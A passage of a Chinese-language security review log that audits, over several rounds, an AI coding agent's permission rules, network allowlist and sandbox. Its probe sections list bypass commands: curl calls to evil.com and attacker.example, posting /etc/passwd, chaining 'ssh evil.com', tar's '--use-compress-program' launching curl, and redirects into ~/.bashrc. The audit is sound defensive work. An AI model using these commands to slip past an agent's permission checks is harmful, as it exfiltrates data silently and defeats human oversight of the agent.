  全是只读或取消。
- 我误把 `schema.rs:273` 的 `enum: ["start","list","stop"]` 当成了 `job` 的 schema，
  实际那是 **`monitor`** 的（同一文件 `:268` 的 `"name": "monitor"`）。
- `monitor` 带 `command` 时**有二次授权**：`tools/monitor.rs:84` 会
  `authorize_tool_call("exec", &exec_args, ...)`，复用完整 exec 权限与沙箱评估
  （这一点第 9 节已验证过，本轮再次确认）。

所以 P3 没有可利用路径。探针里 `job`/`monitor` 返回 Allow 是真的，但无害。
**这已是我第二次在上轮结论上自我更正**（第一次是 `daemon start`），
教训相同：结论只应建立在「该工具真有这个动作」之上。

### 12.5 本轮新发现的 3 项

**R-A `sanitize_extra_rw` 仍是黑名单，残留越权面（中低）**

- 实测通过的值：`/opt`、`/srv`、`/data`、`/home/x/y`（**其他用户的家目录**）。
- 自己家目录、`/`、`/etc`、`/usr` 已挡住，所以上轮那条「项目策略可放大到根」的大口子已经合上；
  剩下的面是「项目策略可以把任意顶层目录、乃至他人 home 加成可写」。
- 他人 home 通常是 `0700`，实际写入会失败，读仅限全局可读文件，故判中低。
- 建议（可选）：既然是安全相关，白名单比黑名单更稳——只允许工作区内路径，
  其余走显式单次确认；如保留黑名单，至少补 `/opt`、`/srv`、`/home/*`（非本用户）。

**R-B 孤儿测试文件 `crates/envoy-agent/src/agent/tests_probe.rs`（低，卫生）**

- 文件存在（untracked），内容是权限探针（`sanitize_extra_rw` 的 `println!`），
  **但没有被任何 `mod` 声明引用**（`grep -rn 'mod tests_probe' crates/envoy-agent/src/` 无命中），
  所以从未被编译、从未运行。
- 它有 **0 个 `assert`**：即使注册进测试树也只是打印，给出「有测试」的假象。
- 看起来是调试残留（与我第 11 节用过的探针同源）。建议删除，
  或改写成带断言的真回归测试并注册。
- 注意：它不影响 CI（未注册），纯粹是树里的死文件。

**R-C `webfetch` 完全绕开新的网络白名单（中）**

- `net_allowlist` 已接进 `exec` 与 `webfetch` 的上下文（`match_rule.rs:97`、`:119-120`），
  但 `mode_baseline` 的 `webfetch` 分支（`rules.rs:412-416`）是
  `PermissionMode::Auto | Turbo => allow(...)` 先匹配，新加的
  `_ if ctx.net_allowlisted => allow(...)` 只在 Default/AcceptEdits 下可达。
- 叠加 3b 短路：auto 下 `webfetch` 在 `rules.rs:307` 就被放行，
  根本走不到 `mode_baseline`。探针实测两条都返回 Allow：

  ```
  webfetch http://attacker.example/x -> Allow (auto mode with an enforcing sandbox)
  webfetch https://github.com/x      -> Allow (auto mode with an enforcing sandbox)
  ```
- 危害面：`webfetch` 在 daemon 进程内发 HTTP（`tools/web.rs:58`），**不经过沙箱**，
  所以沙箱的 `allow_net` 管不住它。auto 模式下 agent 可以把数据塞进 URL
  向任意域名外发而**不产生任何提示**，而同样的事用 `exec curl` 会被 ask。
- 定性：auto 下 `webfetch` 放行是**改动前就有的行为**（原代码就是 `Auto => allow`），
  不是这批引入的回归；但既然这批专门加了网络白名单、并把 `exec` 收紧，
  两者不一致就成了新问题——白名单对 `webfetch` 形同虚设。
- 建议：把 `auto_unallowlisted_net` 的 `tool == "exec"` 条件去掉（改成
  `ctx.needs_net && !ctx.net_allowlisted`），让 auto 下非白名单 `webfetch` 也走 ask；
  或在 `mode_baseline` 的 `webfetch` 分支里去掉 `Auto`。

### 12.6 结论

- 上轮点名的 12 项里：**8 项已修并实测通过**（S1/P1/P2（exec 部分）/Q1/Q3/Q5/Q6），
  4 项未修（Q2/Q4/C3/C7），1 项经复核证明**不成立**（P3，我方误判）。
- 门禁 454 测试 0 失败、clippy 0、fmt 0、尺寸 exit 0，质量在本批继续提升；
  Q1/Q6 这类并发与阻塞问题都补了真测试，不是改完就算。
- 安全面上，「项目策略可拿到 `/` 或 `$HOME`」这个最大口子**已经合上**，
  这是本轮最有价值的成果。
- 仍需处理的是 R-C（webfetch 绕开白名单，与其他项不一致）、R-A（黑名单残留）、
  Q2（write TOCTOU）三项；R-B 是纯卫生问题。

### 12.7 建议的下一步

1. R-C：让 `webfetch` 也受网络白名单约束（一处条件改动，收益明确）。
2. Q2：`write` 用父目录 fd + `O_NOFOLLOW` 打开后 `fstat` 复验。
3. 删掉 `tests_probe.rs`（R-B）。
4. Q4、R-A 可作为下一批；C3/C7/H1/H2 维持原计划。

---

## 13. 第六轮：四次修复复核

针对第 12 节的 R-A/R-B/R-C 与 Q2/Q4/C3/C7 再查。**结论：6 项已修并实测通过、
1 项未修（Q2）；但对抗性复核在「网络白名单」上发现一个高危绕过，
并在 `sanitize_extra_rw` 上发现两条残留缺口。**

### 13.1 门禁：全绿

| 项 | 上轮 | 现在 |
| --- | --- | --- |
| `cargo test --workspace` | 454 通过 | **454 通过 0 失败** |
| `cargo clippy --workspace --all-targets` | 0 | 0 |
| `cargo fmt --all -- --check` | 0 | 0 |
| `scripts/check-file-sizes.py` | exit 0 | exit 0 |

`tests_probe.rs` 孤儿文件已删除，全树扫描无未注册的 `.rs` 文件。

### 13.2 已修复并实测通过（6 项）

**R-C `webfetch` 绕开网络白名单——已修。** `rules.rs:300-304` 的 `auto_unallowlisted_net`
把工具集从 `tool == "exec"` 扩成 `matches!(tool, "exec" | "webfetch")`；
`mode_baseline` 的 `webfetch` 分支（`:414-418`）去掉了 `Auto`，并把
`_ if ctx.net_allowlisted` 提到 `Turbo` 之后、`ask` 之前。探针实测：

```
auto    webfetch http://attacker.example/x  -> Ask    (上轮: Allow)
auto    webfetch https://github.com/x       -> Allow
default webfetch http://attacker.example/x  -> Ask
```

**R-B 孤儿测试文件——已删。** `crates/envoy-agent/src/agent/tests_probe.rs` 不存在了。

**R-A `sanitize_extra_rw` 黑名单——部分修好，仍有缺口（见 13.4）。** 上轮实测能通过的
`/opt`、`/srv`、`/data`、`/home/x/y` 现在全部被拒：

```
/opt  -> []    /srv -> []    /data -> []    /home/x/y -> []    /etc -> []    / -> []
```

**Q4 `flush_text` 丢尾——已修。** `forward.rs:233-256` 改为按 `CHUNK_CHARS = 4000`
在 `char_indices` 的字符边界上循环切块逐条发出，不再 `mem::take` 后截断。
无死循环风险：`split > 0` 保证每轮推进，且不会劈开多字节字符。

**C3 摘要降级不可见——已修（用了比我建议更好的方式）。** 我没有要求新增事件字段，
实际实现是：`context/mod.rs:41-46` 新增 `SummarySource { Model, MaskOnly, Fallback(String) }`，
`CompactionOutcome.summary_source`（`:54`）携带它，`prepare_context_body`（`:275-296`）
在拿到 `Fallback(reason)` 时直接发一条
`AgentEvent::Say { kind: "warn" }`（文案「compaction fell back to deterministic summary (reason)」）。
我核对了这条事件真能到达 UI：TUI 侧 `state/agent_events.rs:193-198` 用 `kind` 作为 level 渲染，
headless 侧 `output.rs:125` 也会输出。也就是说用户这次能看见了。
`MaskOnly` 正确地不告警（掩码不是降级）。

**C7 `persist` 持锁做文件 I/O——已修。** `job.rs:499-507` 现在把
`snapshot_entry`（纯 clone + pid 原子读，无 stat）放在表锁内，
锁释放后才逐个 `attach_log_bytes`（`:506-508`）做 `metadata`。
子代理另外确认了 `submit`/`schedule`/`finish` 都是先放表锁再 `persist`，
不存在 `table → persist_lock` 的反向顺序。

### 13.3 仍未修复（1 项）

**Q2 `write` 的 TOCTOU。** `envoy-core/src/fs.rs:151-166` 的 `write_atomic`
仍是 `create_new` 一个带唯一后缀的 part 文件再 `rename`，无 `O_NOFOLLOW`、
无父目录 dirfd、无 `fstat` 复验。全仓唯一一处 `O_NOFOLLOW` 在
`fs.rs:91`，属 `edit_file` 的**读**路径（既有代码，与本缺陷无关）。
另外 `agent/tools/fs.rs` 对非本地 target 直接跳过 canonical 比对。
定性不变：中危，需要「父目录 fd + `O_NOFOLLOW` 打开 + `fstat` 比对」才算闭环。

H1/H2 与上轮持平：24 处 `too_many_arguments`、`crates/envoy-agent/tests/` 仍为空目录。

### 13.4 本轮新发现：N-A 网络白名单可被绕过（高）

这是本轮最严重的发现。`net_allowlist.rs:51-67` 的 `exec_urls_all_allowlisted`
把整个命令**当一个字符串**、按空白切分、只看小写 `http://`/`https://` 开头的 token。
我写了探针实测（auto + 强制沙箱），**以下五种全部返回 `Allow` 且 `needs_net=true`
（即沙箱拿到 `allow_net: true`）**：

```
curl https://github.com/x && curl evil.com/y           -> Allow   (evil.com 无 scheme，未被识别)
curl https://github.com/ HTTP://evil.com/             -> Allow   (大写 scheme 被前缀判断跳过)
U=http://evil.com; curl "$U" -s https://github.com    -> Allow   (赋值 token 被跳过)
curl https://github.com >/dev/null; ssh evil.com      -> Allow   (ssh 目标不是 URL，整条仍算白名单)
curl https://github.com/ -d @/etc/passwd              -> Allow   (可向白名单域外发文件内容)
```

最严重的是第 4 条：`ssh evil.com` 与白名单 URL 完完全全是两个不同的 segment，
但由于 `exec_urls_all_allowlisted` 不按 segment 判定、只看「有没有非白名单的
`http(s)://` token」，整条命令被判为已白名单，于是不再 ask、沙箱还打开了出网。
第 3 条更糟：`U=http://evil.com` 让 `needs_net` 都变成了 `false`。

- 触发面：`auto` 模式 + 强制沙箱（默认之外的常用组合），agent 可静默外发。
- 与 `AGENTS.md` 的关系：`AGENTS.md` 写的是「shell 检查会切分复合命令」，
  而这条白名单判定**没有**做切分，与同一文件里 `find_match` 按 segment 判定的做法不一致。
- 修复方向：不要基于整串空白切分。应对 `analyze_shell` 的**每个 segment**分别判定：
  该 segment 若 `needs_net`，则要求它的所有类 URL 参数（含无 scheme、忽略大小写）
  以及任何网络型二进制（`ssh`/`nc`/`scp`…）的目标主机都命中白名单，否则 fail-closed 返回 false。
- 测试缺口：`net_allowlist.rs:71-99` 的测试只覆盖「小写 scheme 齐全的 URL」与
  「两个白名单 URL」，上面五种一个都没覆盖。补 5 条断言即可锁住。

### 13.5 本轮新发现：N-B `sanitize_extra_rw` 两处残留缺口（中）

上轮的黑名单补上了 `BLOCKED_TREES`，但末尾的挂载点判定（`paths.rs:170-173`）
用的是**整串精确匹配**：

```rust
matches!(path.to_str(), Some("/var" | "/private/var" | "/private" | "/opt" | "/srv" | "/data" | "/mnt" | "/media"))
```

同一函数里两套语义不一致——上面用 `starts_with`（分量级前缀），这里用 `matches!`（全等）。
实测结果：

```
/mnt            -> []                       (挡住了)
/mnt/usb        -> ["/mnt/usb"]             (放行 —— 整块外置盘可成 rw root)
/media/user/EXT -> ["/media/user/EXT"]      (放行)
/opt/homebrew   -> ["/opt/homebrew"]        (放行)
```

第二个缺口是大小写：`BLOCKED_TREES` 用分量比较但大小写敏感，而 macOS APFS 默认不敏感。
实测 `/ETC`、`/Private/etc` 都能通过：

```
/ETC         -> ["/ETC"]           (macOS 上就是 /etc)
/Private/etc -> ["/Private/etc"]   (macOS 上就是 /etc)
```

（`/etcfoo` 放行是**正确**的，它不是系统目录——说明分量级比较没有误杀，这点没问题。）

- 建议：把 `/mnt`、`/media`、`/opt`、`/srv`、`/data` 等一并放进 `BLOCKED_TREES`
  用分量前缀比较，删掉那个 `matches!` 分支；`BLOCKED_TREES` 比较改成
  `eq_ignore_ascii_case`（或在 macOS 上先 canonicalize 再比）。
- 危害面不变：需要项目策略或用户显式批准才会进入 `extra_rw`，
  所以是「上限被放宽」而非「直接逃逸」，定中危。

### 13.6 本轮新发现：其余 3 条（低）

| 编号 | 问题 | 位置 |
| --- | --- | --- |
| N-C | `/handoff` 走 `summary::summarize_messages`，该包装丢弃 `SummarySource`，所以 Context Reset 回退到确定性摘要时**完全静默**——C3 的告警只覆盖了自动压缩，没覆盖 handoff | `context/mod.rs:275`、`generate_handoff` |
| N-D | `flush_text` 的 `if !chunk.trim().is_empty()` 会**静默丢弃整块纯空白 chunk**（4000 空格），虽无实际影响，但与「不丢内容」的初衷相悖；且仍无「多字节超长 flush」测试 | `runner/forward.rs:247` |
| N-E | `needs_net` 的判定是启发式清单（`shell_classify.rs:17-46`），漏掉 `python3 -c urllib`、`node -e http`、`openssl s_client`、`socat` 等。当前被沙箱 `allow_net: false` 兜住，不构成逃逸；但一旦叠加 N-A 那种「误判为已白名单」，两层防线会同时失效 | `shell_classify.rs:17` |

### 13.7 结论

- 上轮点名的 7 项：**6 项已修并实测通过**（R-A 部分、R-B、R-C、Q4、C3、C7），1 项未修（Q2）。
- C3 的实现方式比我建议的更好：没有往协议里加字段，而是复用 `Say{kind:"warn"}`，
  我核实了 TUI 与 headless 两条渲染路径都能显示。
- 但对抗性复核在**新加的网络白名单**上找到一个高危绕过（N-A）：
  五种写法都能让 auto 模式在不开提示的前提下打开出网，其中「白名单 curl + `ssh evil.com`」
  最直接。这条比上一轮的 R-C 更严重，且与 `AGENTS.md` 宣称的「切分复合命令」不一致。
- `sanitize_extra_rw` 的挂载点与大小写缺口（N-B）是中危残留，需要把两套比较语义统一。

**这一轮不能收工**：N-A 必须先修，它把「自动模式外发」这条路重新打开了。

### 13.8 建议的下一步

1. N-A：`exec_urls_all_allowlisted` 改成按 segment 判定 + fail-closed，补 5 条回归测试。
2. N-B：挂载点并入 `BLOCKED_TREES`，并统一改成大小写不敏感。
3. Q2：`write` 走父目录 fd + `O_NOFOLLOW` + `fstat`。
4. N-C/N-D 顺手修；H1/H2 维持原计划。

---

## 14. 第七轮：五次修复复核

针对第 13 节的 N-A/N-B/Q2/N-C/N-D 再查。**结论：5 项全部修好并实测验证；
但对抗性复核在新白名单的 `SAFE_LOCAL_SINK_BINS` 上找到一个高危新洞，
可绕过整个网络白名单。**

### 14.1 门禁：全绿

| 项 | 上轮 | 现在 |
| --- | --- | --- |
| `cargo test --workspace` | 454 通过 | **454 通过 0 失败**（连跑两次一致） |
| `cargo clippy --workspace --all-targets` | 0 | 0 |
| `cargo fmt --all -- --check` | 0 | 0 |
| `scripts/check-file-sizes.py` | exit 0 | exit 0 |

### 14.2 已修复并实测通过（5 项）

**N-A 网络白名单可绕过——已修，且设计比我建议的更严。**
`net_allowlist.rs:124-155` 的 `exec_segments_all_allowlisted` 现在按
`analyze_shell` 的 segment 逐段判定，fail-closed：

- 任一段带 `sudo`/`xargs` → false；
- `curl`/`wget` 段必须过 `fetcher_segment_allowlisted`（拒绝 `$`/反引号展开、
  拒绝未列入白名单的 opaque 标志）；
- 其它段若 `segment_needs_net` → false；若不在 `SAFE_LOCAL_SINK_BINS` → false；
- 最终必须至少有一个已白名单的 fetcher。

用上轮那 5 条原始命令行重测（auto + 强制沙箱）：

```
curl https://github.com/x && curl evil.com/y           -> Ask   (上轮 Allow)
curl https://github.com/ HTTP://evil.com/             -> Ask   (上轮 Allow)
U=http://evil.com; curl "$U" -s https://github.com    -> Allow + needs_net=false  (沙箱关网)
curl https://github.com >/dev/null; ssh evil.com      -> Ask   (上轮 Allow)
curl https://github.com/ -d @/etc/passwd              -> Ask   (上轮 Allow)
```

第 3 条变成 `needs_net=false` 是正确的处理：命令含变量展开，白名单判定失败，
于是**不打开网络**；此时 `curl "$U"` 在 `--unshare-net` 下也发不出去。
另外验证了合法的下载路径仍放行、新增的防御也生效：

```
curl -fLO https://github.com/.../app.zip     -> Allow
wget https://static.crates.io/x              -> Allow
curl -x http://evil.com https://github.com/x -> Ask   (代理标志被拒)
curl --upload-file /etc/passwd ...           -> Ask   (上传标志被拒)
curl https://github.com/x | sh               -> Ask   (管道到 shell 被拒)
```

**N-B `sanitize_extra_rw` 残留缺口——已修。** 挂载点 `/mnt`、`/media`、
`/opt/homebrew` 并入 `BLOCKED_TREES`（`paths.rs:172-174`），
并把两套比较语义统一成 `path_starts_with_ignore_ascii_case`
与 `path_eq_ignore_ascii_case`（`paths.rs:97-117`）。重测（含上轮失败项）：

```
/mnt -> []   /mnt/usb -> []   /media/user/EXT -> []   /opt/homebrew -> []
/ETC -> []   /Private/etc -> []   /private/etc -> []   /System -> []   /Library -> []
仍保留：/tmp -> ["/tmp"]   /var/tmp -> ["/var/tmp"]
未误杀：/etcfoo -> ["/etcfoo"]
```

`/var/tmp` 和 `/tmp` 保留、`/etcfoo` 不误杀，说明分量级比较是对的。

**Q2 `write` 的 TOCTOU——已修，且是彻底的写法。** 新增
`crates/envoy-core/src/fs_atomic.rs` 的 `PinnedWrite`：

- `create`（`:41-92`）先 `canonicalize(parent)` **再** `open(parent, O_DIRECTORY|O_NOFOLLOW)`
  （顺序正确，不会重新引入 TOCTOU），然后 `openat(dirfd, part, O_CREAT|O_EXCL|O_NOFOLLOW)`；
- `commit`（`:127-167`）用 `libc::renameat(dirfd, part, dirfd, target)` —— 在同一个
  已固定的父目录 fd 内完成重命名，路径上的任何符号链接都换不掉目标；
- `Drop` 在非 committed 路径上删 part 文件，`committed` 只在 rename 成功后置位。

`write_atomic`（`fs.rs:151-159`）已改为 `spawn_blocking` 调用它。
这比我建议的「O_NOFOLLOW + fstat 复验」更干净：用 dirfd 把父目录钉死，
整个 check→write→rename 都在同一个目录句柄下进行。

**N-C `/handoff` 回退静默——已修。** `HandoffOutcome` 新增
`summary_source`（`context/mod.rs:63-65`），`generate_handoff`（`:363`）从
`summarize_messages_with_usage` 拿到它；`runtime/hooks.rs:356-366`
在 `Fallback(reason)` 时 publish 一条 `AgentEvent::Say { kind: "warn" }`，
文案「handoff fell back to deterministic summary (reason)」。与自动压缩那条对称。

**N-D `flush_text` 丢空白块——已修。** `forward.rs:246-256` 去掉了
`if !chunk.trim().is_empty()` 的过滤，改为无条件 emit，循环仍按
`CHUNK_CHARS` 在字符边界推进，无死循环、不劈多字节。

### 14.3 本轮新发现：N-F `SAFE_LOCAL_SINK_BINS` 含可执行/可联网的 sink（高）

这是本轮最严重的发现，且**能绕过整个 N-A 白名单**。

`net_allowlist.rs:35-73` 的 `SAFE_LOCAL_SINK_BINS` 被当作「安全的本地工具」，
但代码**从不检查这些 sink 段的 argv**——只按二进制名匹配。实测（auto + 强制沙箱）
以下几类全部返回 `Allow` 且 `needs_net=true`：

```
curl -s https://github.com/x | tar -xf - --to-command=sh                  -> Allow
curl -s https://github.com/x | tar --use-compress-program='curl http://evil/y' -xf -  -> Allow
curl -s https://github.com/x | rm -rf /tmp/x                              -> Allow
curl -s https://github.com/x | mv /tmp/a /tmp/b                           -> Allow
curl -s https://github.com/x | xz -d > /tmp/o                             -> Allow
```

最要命的是第 2 条：`tar --use-compress-program='curl http://evil/y'` 让 tar
去执行一个**任意命令**，于是整条命令既拿到 `allow_net: true`、又真的发起了
对 `evil.com` 的请求——N-A 精心构建的白名单被一个 sink 参数完全绕过。
第 1 条 `--to-command=sh` 同理，是任意代码执行。

清单里需要重新审视的条目及危险参数：

| 条目 | 危险参数 | 后果 |
| --- | --- | --- |
| `tar` | `--to-command`、`--use-compress-program`、`-I` | 任意命令执行 / 任意网络 |
| `xz` / `zstd` / `bzip2` / `gzip` / `gz` | 无直接执行，但可写任意路径 | 任意路径写入 |
| `rm` / `mv` / `cp` / `chmod` / `mkdir` / `mktemp` / `tee` | 路径参数不受工作区约束 | 改/删工作区外文件 |

- 已有的部分保护：`tee ~/.ssh/authorized_keys` 会被受保护路径守卫拦成 `Ask`，
  这点是好的；但 `/tmp/x`、工作区外普通路径不受限。
- 建议：`SAFE_LOCAL_SINK_BINS` 只保留**纯 stdout 过滤器**
  （`grep`/`rg`/`jq`/`sort`/`head`/`tail`/`tr`/`cut`/`wc`/`sha256sum`/`md5sum`/
  `shasum`/`file`/`stat`/`basename`/`dirname`/`cat`/`uniq`/`head`…），
  删掉 `tar`、`xz`、`zstd`、`bzip2`、`gunzip`、`gzip`、`unzip`、`rm`、`mv`、`cp`、
  `chmod`、`mkdir`、`mktemp`、`tee`、`echo`、`printf`、`true`、`false`、`ls`；
  若确实想保留解压类，必须按二进制做参数白名单（排除 `--to-command`、
  `--use-compress-program`、`-I`、`-o` 等）。
- 补充：这也说明「按名字判定安全」这个前提本身有风险，至少要对 sink 段的
  argv 做黑名单过滤。

### 14.4 本轮新发现：其余 4 条（中低）

| 编号 | 问题 | 位置 | 复现/依据 |
| --- | --- | --- | --- |
| N-G | `-L`/`--location` 在 `BOOL_FLAGS` 里但未禁止，白名单域返回的 30x 可把请求带到白名单外的域 | `net_allowlist.rs` 的 `curl_argv_allowlisted` | 实测 `curl -L -fLO https://github.com/x` → `Allow`。建议强制 `--max-redirs 0` 或拒绝 `-L` |
| N-H | `curl` 会读 `~/.curlrc` / `$CURL_HOME/.curlrc`，`wget` 会读 `.wgetrc` / `$WGETRC`；`url =` 一行即可改目标，而白名单不强制 `-q`/`--disable`/`--no-config` | 同上 | 实测 `curl -q -fLO https://github.com/x` 反而变成 `Ask`，说明 `-q` 根本不在允许标志表里；既表明配置注入未被防，也表明合法用法被误杀 |
| N-I | `write_atomic` 传 `strict_mode=false`（`fs.rs:155`），`fchmod` 失败被忽略；`write_atomic_sync` 才是 `true`（`:184`） | `fs_atomic.rs:133-141` | 影响有限：`create` 本身就用请求的 mode 建文件，所以最终权限不会更宽；仅当 fchmod 是唯一生效路径时才有问题 |
| N-J | `renameat` 成功后无 `fsync(dirfd)`，掉电可能留下零长度或旧文件 | `fs_atomic.rs:146-159` | 建议 `sync_data` 为真时补 `libc::fsync(dirfd)` |

另有子代理提出但**未核对**、不作结论的：`is_allowlisted_http_url` 未拦 `\` 与 `%`
（反斜杠在 WHATWG 解析里等同 `/`，可能与 curl 解析不一致）、
Windows 上 `std::fs::rename` 覆盖已存在文件会失败。

### 14.5 结论

- 上轮点名的 5 项（N-A/N-B/Q2/N-C/N-D）**全部修好**，且 N-A 与 Q2 的修法都优于我的建议：
  N-A 从「整串字符串匹配」重构成「按 segment + fail-closed」，Q2 从「比较后重开」
  重构成「dirfd 钉死父目录 + `renameat`」。
- 门禁 454 测试连跑两次全绿，clippy 0、fmt 0、尺寸 exit 0。
- 但新白名单的 `SAFE_LOCAL_SINK_BINS` 引入了一个高危新洞（N-F）：
  让 `tar --use-compress-program='curl http://evil/y'` 这类写法既开网又执行任意命令。
  **这条必须先修，否则 N-A 的收紧在最常见的「下载后解压」用法上是无效的。**
- N-G（`-L` 跟随重定向）与 N-H（curlrc）是同一条链上的次级缺口，
  建议和 N-F 一起修。

### 14.6 建议的下一步

1. N-F：`SAFE_LOCAL_SINK_BINS` 收缩到纯 stdout 过滤器，删掉所有可执行/可写路径的条目。
2. N-G：拒绝 `-L`/`--location` 或强制 `--max-redirs 0`。
3. N-H：要求 fetcher 段带 `-q`（curl）/`--no-config`（wget），并把 `-q` 加进允许标志表。
4. N-I/N-J 顺手修；H1/H2 维持原计划。

---

## 15. 第八轮：六次修复复核

针对第 14 节的 N-F/N-G/N-H/N-I/N-J 再查。**结论：N-F（高危 sink 绕过）已彻底修好，
N-J 已修，N-E 部分补强；但 `-L`/`-q` 两项仍未处理，
且本轮新发现一条「白名单短路绕过写路径检查」的缺口。**

### 15.1 门禁：全绿

| 项 | 上轮 | 现在 |
| --- | --- | --- |
| `cargo test --workspace` | 454 通过 | **454 通过 0 失败** |
| `cargo clippy --workspace --all-targets` | 0 | 0 |
| `cargo fmt --all -- --check` | 0 | 0 |
| `scripts/check-file-sizes.py` | exit 0（45 软限） | exit 0（**47** 软限） |

### 15.2 已修复（3 项）

**N-F `SAFE_LOCAL_SINK_BINS` 含可执行 sink——已彻底修好。**
清单从 37 条收缩到 16 条，只剩纯 stdout 过滤器：

```
cat cut echo false grep head jq md5sum printf sha256sum shasum tail tr true uniq wc
```

`tar`、`xz`、`zstd`、`bzip2`、`gzip`、`gunzip`、`unzip`、`rm`、`mv`、`cp`、
`chmod`、`mkdir`、`mktemp`、`tee`、`ls`、`rg`、`sort`、`file`、`stat`、
`basename`、`dirname` 全部移除。另外 sink 段现在也开始检查
`seg.raw` 与 argv 中的 `$`/反引号（`net_allowlist.rs:127-128`）。

上轮确认能绕过的五条命令，重测全部变为 `Ask`：

```
curl -s https://github.com/x | tar -xf - --to-command=sh                    -> Ask  (上轮 Allow)
curl -s https://github.com/x | tar --use-compress-program='curl http://evil/y' -xf -  -> Ask  (上轮 Allow)
curl -s https://github.com/x | xz -d > /tmp/o                               -> Ask  (上轮 Allow)
curl -s https://github.com/x | tee /tmp/out                                 -> Ask  (上轮 Allow)
curl -s https://github.com/x | rm -rf /tmp/x                                -> Ask  (上轮 Allow)
```

合法用法仍放行，且新收缩没误伤常见管道：

```
curl -fLO https://github.com/org/repo/releases/download/v1/app.zip  -> Allow
curl -s https://github.com/x | grep ok                             -> Allow
curl -s https://github.com/x | jq .                                -> Allow
```

再验证「管道到未被白名单包裹的解释器」也按预期 fail-closed：

```
curl -s https://github.com/x | python3 -c 'print(1)'  -> Ask
curl -s https://github.com/x | sed 's/a/b/'           -> Ask
```

**N-J `renameat` 后无 `fsync(dirfd)`——已修。** `fs_atomic.rs:160` 在 rename
成功后 `libc::fsync(self.dirfd)`。用 `let _ =` 忽略返回值，
对「尽力而为的持久化」是可接受的取舍。

**N-E `needs_net` 清单——部分补强。** `shell_classify.rs:22` 增加了 `socat`，
`:24-26` 增加了 `openssl`（限定 `s_client`/`ocsp` 子命令）。
`python3`/`node`/`perl` 仍未列入，但见 15.5，这不构成可利用缺口。

**N-I 未改但影响可接受。** `fs.rs:155` 仍传 `strict_mode=false`。
由于 `PinnedWrite::create` 本身就用请求的 mode 建文件，
`fchmod` 失败不会导致权限比请求更宽，所以维持现状是合理的。

### 15.3 仍未处理（2 项）

**N-G `-L`/`--location` 仍被允许，且未强制 `--max-redirs 0`。**
`net_allowlist.rs:197-198` 把 `-L`/`--location` 放在 `BOOL_FLAGS` 里表示「允许出现」，
但全文件没有任何代码拒绝它或限制重定向次数。实测：

```
curl -L -fLO https://github.com/x  -> Allow
```

- 影响：白名单域只要返回一个 302，请求就会被带到白名单外的域，
  而 `allow_net` 已在沙箱层打开，重定向本身不再经过策略判定。
- 现实风险取决于白名单域是否存在开放重定向或被攻破。项目本身把
  `release-assets.githubusercontent.com`、`objects.githubusercontent.com`
  列入白名单，说明重定向是**预期用法**，所以不能简单禁 `-L`。
- 建议：保留 `-L`，但强制 `--max-redirs 0`（或一个小数字）并配合
  「重定向后的最终 URL 也必须在白名单」的二次校验；否则应要求分段下载。

**N-H `-q`/`--disable` 已加入允许列表，但未强制要求。**
`net_allowlist.rs:188-189` 现在接受 `-q`，这修掉了上轮「合法用法被误杀」的问题
（`curl -q -fLO ...` 从 `Ask` 变回 `Allow`）。但**没有任何代码要求它必须存在**：

```
curl -fLO https://github.com/x        -> Allow   (无 -q，仍读 ~/.curlrc)
curl -q -fLO https://github.com/x     -> Allow
```

- 影响：`curl` 会读 `~/.curlrc` / `$CURL_HOME/.curlrc`，`wget` 会读
  `.wgetrc` / `$WGETRC`。写入 `url = http://evil.com/x` 或 `proxy = ...`
  即可改变实际目标，而白名单校验的是 argv。
- 前提是攻击者能写这些文件（家目录），属二阶；沙箱的 workspace 边界通常能挡住。
- 建议：要求 fetcher 段必须带 `-q`（curl）/`--no-config`（wget），
  否则 fail-closed；或把 `HOME`/`CURL_HOME`/`WGETRC` 指向空临时目录。

### 15.4 本轮新发现：N-K 白名单短路绕过写路径检查（中）

这是本轮新发现，成因是上一轮 P2 修复的**覆盖面不全**。

`rules.rs:300-309` 的 3b 短路条件是：

```rust
if relaxed && !ctx.protected_hit {
    return allow(...);
}
```

只检查 `protected_hit`，**没有检查 `outside_workspace`、也没有检查写目标**。
而 `outside_workspace` 的判定要到 `mode_baseline` 的 `exec` 分支
（`rules.rs:424-426`）才发生，那时 3b 早已 return。

实测（auto + 强制沙箱 + 白名单 URL）：

```
curl -s https://github.com/x > ~/.bashrc            -> Allow, outside_workspace=true
curl -s https://github.com/x | grep ok > ~/.profile  -> Allow, outside_workspace=true
curl -s https://github.com/x > /etc/passwd           -> Allow, outside_workspace=true
```

`~/.bashrc`、`~/.profile`、`/etc/passwd` 都不是受保护路径
（受保护的是 `.git/.ssh/.env/.envoy/.aws` 与 `/etc/{shadow,gshadow,sudoers}`），
所以整条命令被判 Allow，且沙箱层面 `allow_net` 也是打开的。

作为对照，受保护路径确实仍被拦住：

```
curl -s https://github.com/x > ~/.ssh/authorized_keys      -> Ask
curl -s https://github.com/x > ~/.env                      -> Ask
curl -s https://github.com/x > ./.envoy/permissions.json   -> Ask
```

- **实际危害被沙箱限制住**：`WorkspaceWrite { cwd, extra_rw }` 不含家目录与 `/etc`，
  bwrap 会拒绝这些写入。所以是「策略层失效、纵深防御只剩沙箱一层」，
  而不是「直接可写」。
- 但它与 `AGENTS.md` 里「shell 命令引用工作区外路径 → ask」的表述矛盾，
  也让 `outside_workspace` 这条规则在 auto + 白名单网络下完全失效。
- 定性：中。不构成直接逃逸，但一旦沙箱后端退化（Landlock 的
  `can_protect_subpaths=false`）或用户放宽 `extra_rw`，就成了真问题。
- 建议：3b 短路条件补上 `&& !ctx.outside_workspace`；
  若担心误伤正常下载，至少对「带写重定向或 `write_paths` 非空」的情况不短路。

### 15.5 N-E 残留为什么不算问题

`python3`/`node` 不在 `needs_net` 清单里，实测：

```
python3 -c 'import urllib.request;urlopen("http://evil.com")'  -> Allow 但 needs_net=false
```

`needs_net=false` 意味着沙箱拿到 `allow_net: false` → `--unshare-net`，
网络命名空间直接断开，命令发不出去。所以这是「策略层不拦、沙箱兜住」，
与 N-K 同类但无写入副作用。维持低危。

真正的风险是**双重失效**：若某天白名单判定误报 `net_allowlisted=true`，
`needs_net` 的漏判就会与白名单误判叠加。建议把常见解释器
（`python`/`python3`/`node`/`ruby`/`perl`/`php`）加入 `needs_net` 作为纯冗余防线。

### 15.6 整体遗留清单

| 编号 | 问题 | 严重度 | 状态 |
| --- | --- | --- | --- |
| N-K | 白名单短路绕过 `outside_workspace` 检查 | 中 | **本轮新发现** |
| N-G | `-L` 未限制重定向目标/次数 | 中 | 未修 |
| N-H | fetcher 未强制 `-q`/`--no-config` | 中低 | 部分修（已允许，未强制） |
| N-E | 解释器未列入 `needs_net` | 低 | 部分修 |
| H1 | 24 处 `too_many_arguments`、47 个软限超标 | 中 | 未动 |
